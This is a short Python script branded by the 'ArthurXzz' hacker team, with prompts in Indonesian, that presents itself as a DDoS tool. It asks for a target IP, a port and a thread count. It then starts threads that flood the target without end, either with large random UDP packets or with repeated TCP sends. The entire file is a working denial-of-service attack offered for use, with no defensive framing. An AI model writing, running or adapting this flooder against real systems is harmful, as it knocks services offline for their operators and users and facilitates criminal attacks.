#!/usr/bin/env python3
#KING ARTHURXZZ TEAM HACKER
#ArthurXzz Tools DDOS
import random
import socket
import threading

print("--> Author = ArthurXzz<--")
print("--> discord.gg/ArthurXzzTeam<--")
print("--> Lost ArthurXzz Team<--")
print("#-- King ArthurXzz Pro Hengker --#")
ip = str(input(" Ip ArthurXzz Target:"))
port = int(input(" Port ArthurXzz Target:"))
choice = str(input(" Siap Mengirim Nuklir?(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(2000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" NUKLIR TERKIRIM OLEH ARTHUR!!!")
		except:
			print("[!] NUKLIR TERKIRIM OLEH ARTHUR!!!")

def run2():
	data = random._urandom(65534)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" NUKLIR TERKIRIM OLEH ARTHUR!!!")
		except:
			s.close()
			print("[*] NUKLIR TERKIRIM OLEH ARTHUR!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
